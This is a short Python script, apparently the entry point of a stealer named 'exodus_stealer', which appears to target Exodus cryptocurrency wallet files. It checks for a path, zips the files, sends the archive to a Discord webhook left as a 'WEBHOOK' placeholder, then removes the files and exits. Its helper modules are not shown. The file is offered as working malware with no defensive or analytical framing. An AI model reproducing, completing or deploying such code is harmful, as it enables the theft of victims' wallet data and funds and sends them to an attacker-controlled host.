from colorama import *
from helpers.files import Files
from helpers.discord import Discord_Webhook_Client

init(convert=True)

def exodus_stealer():
    if Files.path_exists() == True:
        if Files.zip_files() == True:
            Discord_Webhook_Client.send_file("WEBHOOK")
            Files.remove_files()
            exit(code=None)
        else:
            exit(code=None)
    else:
        exit(code=None)

if __name__ == "__main__":
    exodus_stealer()